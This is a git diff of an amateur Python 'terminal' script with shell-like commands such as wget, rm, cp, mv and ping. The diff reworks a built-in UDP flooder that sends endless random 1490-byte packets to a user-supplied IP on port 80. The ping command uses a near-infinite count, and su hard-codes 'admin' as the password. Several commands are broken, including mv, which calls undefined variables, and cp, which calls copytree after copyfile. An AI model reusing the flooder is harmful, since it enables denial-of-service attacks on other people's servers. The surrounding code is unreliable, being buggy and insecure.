@@ -1,4 +1,6 @@
 #!/usr/local/bin/python3.8
+import random
+import socket
 import zipfile
 import pathlib
 import shutil
@@ -45,10 +47,9 @@ good luck!
     bytes = random._urandom(1490)
     #############
     #get ip and port from user
-    ip = input("IP Target:")
-    port = int(input("Port:"))
+    ip = a[4:]
     ############
-    print (colored("[                    ] 0% ","blue"))
+    print (colored("[                    ] 0% ","green"))
     time.sleep(1)
     print (colored("[=====               ] 25%","red"))
     time.sleep(1)
@@ -61,12 +62,11 @@ good luck!
     sent = 0
     while True:
         #send packets
-        sock.sendto(bytes,(ip,port))
+        sock.sendto(bytes,(a[4:],80))
         sent = sent + 1
-        port = port
-        print (colored("Sent %s packet to %s throught port:%s"%(sent,ip,port),"green"))
-        if port == 65534:
-            port = 1
+        print(colored("Sent "+str(sent)+" packets to "+a[4:],"green"))
+
+
 def compress(tar_file, members):
     """
     Adds files (`members`) to a tar_file and compress it
@@ -137,6 +137,9 @@ while True:
    elif a.startswith("wget "):
       url = a[5:]
       filename = wget.download(url)
+      progress = tqdm(filename)
+      for member in progress:
+        progress.set_description(f"downloading {url}")
       print("file is downloading")
    elif a.startswith("rm "):
       s = a[3:]
@@ -149,11 +152,11 @@ while True:
       hardware()
    elif a.startswith("pwd"):
       print(os.getcwd())
-   elif a.startswith("whoami"):
+   elif a == "whoami":
       print(getpass.getuser())
    elif a.startswith("python"):
       os.system("python3.8")
-   elif a.startswith("myip"):
+   elif a == "myip":
       ip()
    elif a.startswith("ping "):
       ping(a[5:],verbose=True,count=999999999999)
@@ -195,31 +198,31 @@ while True:
    elif a.startswith("mkdir "):
       os.mkdir(a[6:])
       print(colored("file has created","green"))
-   elif a.startswith("cp"):
-      src = input("enter a file path to copy:")
+   elif a.startswith("cp "):
+      src = a[3:]
       des = input("enter a destination path to copy:")
       cp = shutil.copyfile(src,des)
       print(colored("file "+src+" has copied to "+des +" successfully!","green"))
       shutil.copytree(src, des)
-   elif a.startswith("mv"):
-      src = input("enter a file path to move:")
+   elif a.startswith("mv "):
+      src = a[3:]
       des = input("enter a destination path to move:")
       dest = shutil.move(source, destination)
       print(colored("file "+src+ "moved successfully to "+des,"green"))
-   elif a.startswith("rename"):
-      inp = input("enter file path:")
+   elif a.startswith("rename "):
+      inp = a[7:]
       inp2 = input("enter a file new name :")
       os.rename(inp,inp2)
       print(colored("file "+inp+" successfully renamed to "+inp2,"green"))
-   elif a.startswith("su"):
+   elif a == "su":
       password = "admin"
       a = input("your root password:")
       print("logged in as "+a)
       print("tip:default root password is admin.\n for change root password open terminal.py file and com to 58 line and change your password.")
-   elif a.startswith("exit"):
+   elif a == "exit":
       print("exited successfully!")
       break
-   elif a.startswith("help"):
+   elif a == "help":
       print(colored("""
 
 
@@ -374,3 +377,5 @@ time command:
 
 
 ""","green"))
+   else:
+      print(colored("command "+colored(a,"red")+colored(" not found!","green"),"green"))
